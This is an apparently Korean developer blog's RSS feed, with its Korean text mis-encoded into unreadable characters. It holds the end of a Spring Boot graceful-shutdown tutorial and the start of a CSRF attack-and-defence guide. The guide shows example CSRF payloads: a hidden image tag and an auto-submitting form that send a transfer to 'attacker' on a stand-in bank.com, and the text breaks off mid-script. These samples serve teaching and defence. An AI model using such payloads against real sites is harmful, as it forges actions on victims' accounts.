class="line">        <span class="type">ThreadPoolTaskExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolTaskExecutor</span>();</span><br><span class="line">        executor.setCorePoolSize(<span class="number">10</span>);</span><br><span class="line">        executor.setMaxPoolSize(<span class="number">20</span>);</span><br><span class="line">        executor.setQueueCapacity(<span class="number">100</span>);</span><br><span class="line">        executor.setWaitForTasksToCompleteOnShutdown(<span class="literal">true</span>);  <span class="comment">// ì¤‘ìš”!</span></span><br><span class="line">        executor.setAwaitTerminationSeconds(<span class="number">60</span>);  <span class="comment">// ìµœëŒ€ ëŒ€ê¸° ì‹œê°„</span></span><br><span class="line">        executor.setThreadNamePrefix(<span class="string">&quot;async-&quot;</span>);</span><br><span class="line">        executor.initialize();</span><br><span class="line">        <span class="keyword">return</span> executor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ë©”ì‹œì§€-í-ë¦¬ìŠ¤ë„ˆ"><a href="#ë©”ì‹œì§€-í-ë¦¬ìŠ¤ë„ˆ" class="headerlink" title="ë©”ì‹œì§€ í ë¦¬ìŠ¤ë„ˆ"></a>ë©”ì‹œì§€ í ë¦¬ìŠ¤ë„ˆ</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MessageQueueListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicInteger</span> <span class="variable">processingCount</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RabbitListener(queues = &quot;my-queue&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        processingCount.incrementAndGet();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ë©”ì‹œì§€ ì²˜ë¦¬</span></span><br><span class="line">            processMessage(message);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            processingCount.decrementAndGet();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PreDestroy</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onShutdown</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;ë©”ì‹œì§€ ì²˜ë¦¬ ëŒ€ê¸° ì¤‘: &#123;&#125;&quot;</span>, processingCount.get());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì²˜ë¦¬ ì¤‘ì¸ ë©”ì‹œì§€ê°€ ì—†ì„ ë•Œê¹Œì§€ ëŒ€ê¸°</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">waitTime</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (processingCount.get() &gt; <span class="number">0</span> &amp;&amp; waitTime &lt; <span class="number">30000</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            waitTime += <span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log.info(<span class="string">&quot;ëª¨ë“  ë©”ì‹œì§€ ì²˜ë¦¬ ì™„ë£Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="comment">// ë©”ì‹œì§€ ì²˜ë¦¬ ë¡œì§</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ëª¨ë‹ˆí„°ë§-ë°-ë¡œê¹…"><a href="#ëª¨ë‹ˆí„°ë§-ë°-ë¡œê¹…" class="headerlink" title="ëª¨ë‹ˆí„°ë§ ë° ë¡œê¹…"></a>ëª¨ë‹ˆí„°ë§ ë° ë¡œê¹…</h2><h3 id="Shutdown-ì´ë²¤íŠ¸-ì²˜ë¦¬"><a href="#Shutdown-ì´ë²¤íŠ¸-ì²˜ë¦¬" class="headerlink" title="Shutdown ì´ë²¤íŠ¸ ì²˜ë¦¬"></a>Shutdown ì´ë²¤íŠ¸ ì²˜ë¦¬</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShutdownEventListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@EventListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleContextClose</span><span class="params">(ContextClosedEvent event)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;ì• í”Œë¦¬ì¼€ì´ì…˜ ì»¨í…ìŠ¤íŠ¸ ì¢…ë£Œ ì‹œì‘&quot;</span>);</span><br><span class="line">        <span class="comment">// ë©”íŠ¸ë¦­ ì „ì†¡, ì•Œë¦¼ ë“±</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@EventListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleContextStopped</span><span class="params">(ContextStoppedEvent event)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;ì• í”Œë¦¬ì¼€ì´ì…˜ ì»¨í…ìŠ¤íŠ¸ ì •ì§€ë¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ì•¡ì¶”ì—ì´í„°ë¥¼-í†µí•œ-ëª¨ë‹ˆí„°ë§"><a href="#ì•¡ì¶”ì—ì´í„°ë¥¼-í†µí•œ-ëª¨ë‹ˆí„°ë§" class="headerlink" title="ì•¡ì¶”ì—ì´í„°ë¥¼ í†µí•œ ëª¨ë‹ˆí„°ë§"></a>ì•¡ì¶”ì—ì´í„°ë¥¼ í†µí•œ ëª¨ë‹ˆí„°ë§</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoint:</span></span><br><span class="line">    <span class="attr">shutdown:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span>  <span class="comment"># /actuator/shutdown ì—”ë“œí¬ì¸íŠ¸ í™œì„±í™”</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">health,info,shutdown</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HealthController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">shuttingDown</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PreDestroy</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onShutdown</span><span class="params">()</span> &#123;</span><br><span class="line">        shuttingDown = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/health/ready&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">readiness</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (shuttingDown) &#123;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(<span class="number">503</span>).body(<span class="string">&quot;Shutting down&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(<span class="string">&quot;Ready&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ì£¼ì˜ì‚¬í•­"><a href="#ì£¼ì˜ì‚¬í•­" class="headerlink" title="ì£¼ì˜ì‚¬í•­"></a>ì£¼ì˜ì‚¬í•­</h2><h3 id="1-íƒ€ì„ì•„ì›ƒ-ì„¤ì •"><a href="#1-íƒ€ì„ì•„ì›ƒ-ì„¤ì •" class="headerlink" title="1. íƒ€ì„ì•„ì›ƒ ì„¤ì •"></a>1. íƒ€ì„ì•„ì›ƒ ì„¤ì •</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">K8s terminationGracePeriodSeconds (60s)</span><br><span class="line">  &gt; Spring timeout-per-shutdown-phase (45s)</span><br><span class="line">    &gt; ì‹¤ì œ ì‘ì—… ì™„ë£Œ ì˜ˆìƒ ì‹œê°„ (30s)</span><br></pre></td></tr></table></figure><p>ì—¬ìœ  ì‹œê°„ì„ ë‘ì–´ ê°•ì œ ì¢…ë£Œ(SIGKILL)ë¥¼ ë°©ì§€í•©ë‹ˆë‹¤.</p><h3 id="2-ë°ë“œë½-ë°©ì§€"><a href="#2-ë°ë“œë½-ë°©ì§€" class="headerlink" title="2. ë°ë“œë½ ë°©ì§€"></a>2. ë°ë“œë½ ë°©ì§€</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PreDestroy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cleanup</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// íƒ€ì„ì•„ì›ƒ ì„¤ì • í•„ìˆ˜</span></span><br><span class="line">    <span class="keyword">if</span> (!executorService.awaitTermination(<span class="number">30</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;ì¼ë¶€ ì‘ì—…ì´ íƒ€ì„ì•„ì›ƒë¨&quot;</span>);</span><br><span class="line">        executorService.shutdownNow();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-ë©±ë“±ì„±-ë³´ì¥"><a href="#3-ë©±ë“±ì„±-ë³´ì¥" class="headerlink" title="3. ë©±ë“±ì„± ë³´ì¥"></a>3. ë©±ë“±ì„± ë³´ì¥</h3><p>Shutdown Hookì€ ì—¬ëŸ¬ ë²ˆ ì‹¤í–‰ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ë©±ë“±ì„±ì„ ë³´ì¥í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">shutdownCompleted</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PreDestroy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">onShutdown</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (shutdownCompleted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// ì •ë¦¬ ì‘ì—…</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        shutdownCompleted = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="í…ŒìŠ¤íŠ¸"><a href="#í…ŒìŠ¤íŠ¸" class="headerlink" title="í…ŒìŠ¤íŠ¸"></a>í…ŒìŠ¤íŠ¸</h2><h3 id="ë¡œì»¬-í…ŒìŠ¤íŠ¸"><a href="#ë¡œì»¬-í…ŒìŠ¤íŠ¸" class="headerlink" title="ë¡œì»¬ í…ŒìŠ¤íŠ¸"></a>ë¡œì»¬ í…ŒìŠ¤íŠ¸</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ì• í”Œë¦¬ì¼€ì´ì…˜ ì‹œì‘</span></span><br><span class="line">./gradlew bootRun</span><br><span class="line"></span><br><span class="line"><span class="comment"># SIGTERM ì „ì†¡ (Graceful Shutdown íŠ¸ë¦¬ê±°)</span></span><br><span class="line"><span class="built_in">kill</span> -15 &lt;PID&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ë¡œê·¸ í™•ì¸</span></span><br><span class="line"><span class="comment"># ì§„í–‰ ì¤‘ì¸ ìš”ì²­ì´ ì™„ë£Œë  ë•Œê¹Œì§€ ëŒ€ê¸°í•˜ëŠ”ì§€ í™•ì¸</span></span><br></pre></td></tr></table></figure><h3 id="í†µí•©-í…ŒìŠ¤íŠ¸"><a href="#í†µí•©-í…ŒìŠ¤íŠ¸" class="headerlink" title="í†µí•© í…ŒìŠ¤íŠ¸"></a>í†µí•© í…ŒìŠ¤íŠ¸</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GracefulShutdownTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ConfigurableApplicationContext context;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">gracefulShutdown</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ë¹„ë™ê¸° ì‘ì—… ì‹œì‘</span></span><br><span class="line">        Future&lt;String&gt; future = executeLongTask();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì»¨í…ìŠ¤íŠ¸ ì¢…ë£Œ</span></span><br><span class="line">        context.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ì‘ì—…ì´ ì™„ë£Œë˜ì—ˆëŠ”ì§€ í™•ì¸</span></span><br><span class="line">        assertThat(future.isDone()).isTrue();</span><br><span class="line">        assertThat(future.get()).isEqualTo(<span class="string">&quot;ì™„ë£Œ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ì •ë¦¬"><a href="#ì •ë¦¬" class="headerlink" title="ì •ë¦¬"></a>ì •ë¦¬</h2><p>Graceful Shutdownì€ í”„ë¡œë•ì…˜ í™˜ê²½ì—ì„œ í•„ìˆ˜ì ì¸ ê¸°ëŠ¥ì…ë‹ˆë‹¤:</p><ol><li><strong>Spring Boot ì„¤ì •</strong>: <code>server.shutdown=graceful</code></li><li><strong>íƒ€ì„ì•„ì›ƒ ì„¤ì •</strong>: ì ì ˆí•œ ëŒ€ê¸° ì‹œê°„ ì„¤ì •</li><li><strong>ë¦¬ì†ŒìŠ¤ ì •ë¦¬</strong>: @PreDestroy, SmartLifecycle í™œìš©</li><li><strong>K8s ê³ ë ¤</strong>: terminationGracePeriodSecondsì™€ ì¡°í™”</li><li><strong>ëª¨ë‹ˆí„°ë§</strong>: ë¡œê¹… ë° í—¬ìŠ¤ì²´í¬ êµ¬í˜„</li></ol><p>ì ì ˆí•œ Graceful Shutdown êµ¬í˜„ìœ¼ë¡œ ë¬´ì¤‘ë‹¨ ë°°í¬ì™€ ì•ˆì •ì ì¸ ì„œë¹„ìŠ¤ ìš´ì˜ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Java/">Java</category>
      
      
      <category domain="https://ckck803.github.io/tags/Spring-Boot/">Spring Boot</category>
      
      <category domain="https://ckck803.github.io/tags/Graceful-Shutdown/">Graceful Shutdown</category>
      
      <category domain="https://ckck803.github.io/tags/Shutdown-Hook/">Shutdown Hook</category>
      
      <category domain="https://ckck803.github.io/tags/JVM/">JVM</category>
      
      
      <comments>https://ckck803.github.io/2025/12/11/java/graceful-shutdown/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Web Security] CSRF ê³µê²©ê³¼ ë°©ì–´ ê¸°ë²• ì™„ë²½ ê°€ì´ë“œ</title>
      <link>https://ckck803.github.io/2025/12/04/security/csrf/</link>
      <guid>https://ckck803.github.io/2025/12/04/security/csrf/</guid>
      <pubDate>Wed, 03 Dec 2025 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;ğŸ¯-CSRF-Cross-Site-Request-Forgery-ë€&quot;&gt;&lt;a href=&quot;#ğŸ¯-CSRF-Cross-Site-Request-Forgery-ë€&quot; class=&quot;headerlink&quot; title=&quot;ğŸ¯ CSRF(Cross-Site Request Forgery)ë€?&quot;&gt;&lt;/a&gt;ğŸ¯ CSRF(Cross-Site Request Forgery)ë€?&lt;/h2&gt;&lt;p&gt;CSRFëŠ” &lt;strong&gt;ì‚¬ìš©ìê°€ ì˜ë„í•˜ì§€ ì•Šì€ ìš”ì²­ì„ ê³µê²©ìê°€ ë§Œë“  ì›¹ì‚¬ì´íŠ¸ë¥¼ í†µí•´ ì‹¤í–‰ì‹œí‚¤ëŠ” ê³µê²©&lt;/strong&gt;ì…ë‹ˆë‹¤.&lt;br&gt;ì‚¬ìš©ìê°€ ì´ë¯¸ ë¡œê·¸ì¸ë˜ì–´ ìˆëŠ” ì‚¬ì´íŠ¸ì—ì„œ, ê³µê²©ìê°€ ì¡°ì‘í•œ ìš”ì²­ì„ &lt;strong&gt;ì‚¬ìš©ì ëª°ë˜&lt;/strong&gt; ì „ì†¡í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-ì˜ˆì‹œ&quot;&gt;&lt;a href=&quot;#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-ì˜ˆì‹œ&quot; class=&quot;headerlink&quot; title=&quot;ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì˜ˆì‹œ&quot;&gt;&lt;/a&gt;ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì˜ˆì‹œ&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;ì‚¬ìš©ìê°€ ì€í–‰ ì‚¬ì´íŠ¸(&lt;code&gt;bank.com&lt;/code&gt;)ì— ë¡œê·¸ì¸ë˜ì–´ ìˆìŒ&lt;/li&gt;
&lt;li&gt;ê³µê²©ìê°€ ë§Œë“  ì•…ì„± ì‚¬ì´íŠ¸(&lt;code&gt;evil.com&lt;/code&gt;)ë¥¼ ë°©ë¬¸&lt;/li&gt;
&lt;li&gt;ì•…ì„± ì‚¬ì´íŠ¸ì— ìˆ¨ê²¨ì§„ ì½”ë“œê°€ &lt;code&gt;bank.com&lt;/code&gt;ìœ¼ë¡œ ì†¡ê¸ˆ ìš”ì²­ì„ ì „ì†¡&lt;/li&gt;
&lt;li&gt;ë¸Œë¼ìš°ì €ëŠ” ìë™ìœ¼ë¡œ ì¿ í‚¤ë¥¼ í¬í•¨í•´ ìš”ì²­ì„ ì „ì†¡&lt;/li&gt;
&lt;li&gt;ì€í–‰ ì„œë²„ëŠ” ì •ìƒì ì¸ ìš”ì²­ìœ¼ë¡œ ì¸ì‹í•˜ê³  ì²˜ë¦¬&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;ğŸ”-CSRF-ê³µê²©ì˜-í•µì‹¬-ì›ë¦¬&quot;&gt;&lt;a href=&quot;#ğŸ”-CSRF-ê³µê²©ì˜-í•µì‹¬-ì›ë¦¬&quot; class=&quot;headerlink&quot; title=&quot;ğŸ” CSRF ê³µê²©ì˜ í•µì‹¬ ì›ë¦¬&quot;&gt;&lt;/a&gt;ğŸ” CSRF ê³µê²©ì˜ í•µì‹¬ ì›ë¦¬&lt;/h2&gt;&lt;h3 id=&quot;ë¸Œë¼ìš°ì €ì˜-ì¿ í‚¤-ìë™-ì „ì†¡&quot;&gt;&lt;a href=&quot;#ë¸Œë¼ìš°ì €ì˜-ì¿ í‚¤-ìë™-ì „ì†¡&quot; class=&quot;headerlink&quot; title=&quot;ë¸Œë¼ìš°ì €ì˜ ì¿ í‚¤ ìë™ ì „ì†¡&quot;&gt;&lt;/a&gt;ë¸Œë¼ìš°ì €ì˜ ì¿ í‚¤ ìë™ ì „ì†¡&lt;/h3&gt;&lt;p&gt;ë¸Œë¼ìš°ì €ëŠ” &lt;strong&gt;ê°™ì€ ë„ë©”ì¸ìœ¼ë¡œì˜ ëª¨ë“  ìš”ì²­ì— ìë™ìœ¼ë¡œ ì¿ í‚¤ë¥¼ ì²¨ë¶€&lt;/strong&gt;í•©ë‹ˆë‹¤.&lt;/p&gt;
&lt;figure class=&quot;highlight http&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;/transfer?to=attacker&amp;amp;amount=10000&lt;/span&gt; &lt;span class=&quot;meta&quot;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;: &lt;/span&gt;bank.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;punctuation&quot;&gt;: &lt;/span&gt;session_id=abc123  â† ìë™ìœ¼ë¡œ í¬í•¨ë¨!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ê³µê²©-ì½”ë“œ-ì˜ˆì‹œ&quot;&gt;&lt;a href=&quot;#ê³µê²©-ì½”ë“œ-ì˜ˆì‹œ&quot; class=&quot;headerlink&quot; title=&quot;ê³µê²© ì½”ë“œ ì˜ˆì‹œ&quot;&gt;&lt;/a&gt;ê³µê²© ì½”ë“œ ì˜ˆì‹œ&lt;/h3&gt;&lt;h4 id=&quot;1-ì´ë¯¸ì§€-íƒœê·¸ë¥¼-ì´ìš©í•œ-ê³µê²©&quot;&gt;&lt;a href=&quot;#1-ì´ë¯¸ì§€-íƒœê·¸ë¥¼-ì´ìš©í•œ-ê³µê²©&quot; class=&quot;headerlink&quot; title=&quot;1. ì´ë¯¸ì§€ íƒœê·¸ë¥¼ ì´ìš©í•œ ê³µê²©&quot;&gt;&lt;/a&gt;1. ì´ë¯¸ì§€ íƒœê·¸ë¥¼ ì´ìš©í•œ ê³µê²©&lt;/h4&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="ğŸ¯-CSRF-Cross-Site-Request-Forgery-ë€"><a href="#ğŸ¯-CSRF-Cross-Site-Request-Forgery-ë€" class="headerlink" title="ğŸ¯ CSRF(Cross-Site Request Forgery)ë€?"></a>ğŸ¯ CSRF(Cross-Site Request Forgery)ë€?</h2><p>CSRFëŠ” <strong>ì‚¬ìš©ìê°€ ì˜ë„í•˜ì§€ ì•Šì€ ìš”ì²­ì„ ê³µê²©ìê°€ ë§Œë“  ì›¹ì‚¬ì´íŠ¸ë¥¼ í†µí•´ ì‹¤í–‰ì‹œí‚¤ëŠ” ê³µê²©</strong>ì…ë‹ˆë‹¤.<br>ì‚¬ìš©ìê°€ ì´ë¯¸ ë¡œê·¸ì¸ë˜ì–´ ìˆëŠ” ì‚¬ì´íŠ¸ì—ì„œ, ê³µê²©ìê°€ ì¡°ì‘í•œ ìš”ì²­ì„ <strong>ì‚¬ìš©ì ëª°ë˜</strong> ì „ì†¡í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.</p><h3 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-ì˜ˆì‹œ"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤-ì˜ˆì‹œ" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì˜ˆì‹œ"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ì˜ˆì‹œ</h3><ol><li>ì‚¬ìš©ìê°€ ì€í–‰ ì‚¬ì´íŠ¸(<code>bank.com</code>)ì— ë¡œê·¸ì¸ë˜ì–´ ìˆìŒ</li><li>ê³µê²©ìê°€ ë§Œë“  ì•…ì„± ì‚¬ì´íŠ¸(<code>evil.com</code>)ë¥¼ ë°©ë¬¸</li><li>ì•…ì„± ì‚¬ì´íŠ¸ì— ìˆ¨ê²¨ì§„ ì½”ë“œê°€ <code>bank.com</code>ìœ¼ë¡œ ì†¡ê¸ˆ ìš”ì²­ì„ ì „ì†¡</li><li>ë¸Œë¼ìš°ì €ëŠ” ìë™ìœ¼ë¡œ ì¿ í‚¤ë¥¼ í¬í•¨í•´ ìš”ì²­ì„ ì „ì†¡</li><li>ì€í–‰ ì„œë²„ëŠ” ì •ìƒì ì¸ ìš”ì²­ìœ¼ë¡œ ì¸ì‹í•˜ê³  ì²˜ë¦¬</li></ol><h2 id="ğŸ”-CSRF-ê³µê²©ì˜-í•µì‹¬-ì›ë¦¬"><a href="#ğŸ”-CSRF-ê³µê²©ì˜-í•µì‹¬-ì›ë¦¬" class="headerlink" title="ğŸ” CSRF ê³µê²©ì˜ í•µì‹¬ ì›ë¦¬"></a>ğŸ” CSRF ê³µê²©ì˜ í•µì‹¬ ì›ë¦¬</h2><h3 id="ë¸Œë¼ìš°ì €ì˜-ì¿ í‚¤-ìë™-ì „ì†¡"><a href="#ë¸Œë¼ìš°ì €ì˜-ì¿ í‚¤-ìë™-ì „ì†¡" class="headerlink" title="ë¸Œë¼ìš°ì €ì˜ ì¿ í‚¤ ìë™ ì „ì†¡"></a>ë¸Œë¼ìš°ì €ì˜ ì¿ í‚¤ ìë™ ì „ì†¡</h3><p>ë¸Œë¼ìš°ì €ëŠ” <strong>ê°™ì€ ë„ë©”ì¸ìœ¼ë¡œì˜ ëª¨ë“  ìš”ì²­ì— ìë™ìœ¼ë¡œ ì¿ í‚¤ë¥¼ ì²¨ë¶€</strong>í•©ë‹ˆë‹¤.</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/transfer?to=attacker&amp;amount=10000</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>bank.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session_id=abc123  â† ìë™ìœ¼ë¡œ í¬í•¨ë¨!</span><br></pre></td></tr></table></figure><h3 id="ê³µê²©-ì½”ë“œ-ì˜ˆì‹œ"><a href="#ê³µê²©-ì½”ë“œ-ì˜ˆì‹œ" class="headerlink" title="ê³µê²© ì½”ë“œ ì˜ˆì‹œ"></a>ê³µê²© ì½”ë“œ ì˜ˆì‹œ</h3><h4 id="1-ì´ë¯¸ì§€-íƒœê·¸ë¥¼-ì´ìš©í•œ-ê³µê²©"><a href="#1-ì´ë¯¸ì§€-íƒœê·¸ë¥¼-ì´ìš©í•œ-ê³µê²©" class="headerlink" title="1. ì´ë¯¸ì§€ íƒœê·¸ë¥¼ ì´ìš©í•œ ê³µê²©"></a>1. ì´ë¯¸ì§€ íƒœê·¸ë¥¼ ì´ìš©í•œ ê³µê²©</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ì‚¬ìš©ìê°€ evil.comì„ ë°©ë¬¸í–ˆì„ ë•Œ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.com/transfer?to=attacker&amp;amount=10000&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-ìë™-ì œì¶œ-í¼ì„-ì´ìš©í•œ-ê³µê²©"><a href="#2-ìë™-ì œì¶œ-í¼ì„-ì´ìš©í•œ-ê³µê²©" class="headerlink" title="2. ìë™ ì œì¶œ í¼ì„ ì´ìš©í•œ ê³µê²©"></a>2. ìë™ ì œì¶œ í¼ì„ ì´ìš©í•œ ê³µê²©</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://bank.com/transfer&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hack&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span 